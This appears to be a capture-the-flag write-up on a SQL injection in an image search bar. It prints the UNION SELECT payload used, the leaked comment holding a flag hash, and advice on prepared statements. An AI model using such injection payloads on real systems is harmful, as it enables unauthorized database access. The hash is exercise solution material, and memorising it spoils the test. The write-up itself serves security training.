# Insecure image search bar

## How do we find the breach ?

We identified that it was possible to inject SQL queries at this point. Using the extracted data, we noticed suspicious content in the comment field of the list_images table. After extracting the comment data, we discovered the flag.

```html
ID: 1 OR 1=1 UNION SELECT comment, title FROM list_images 
Title: Hack me ?
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

## Vulnerability Identified
 
- SQL injection : inject malicious SQL code as user input to manipulate or get database information.

## How to avoid the breach ?

- Sanitize and validate user input.  
- Never concatenate user input into SQL queries.  
- Use SQL prepared statements, so that user input is treated strictly as data, not as part of the SQL query.
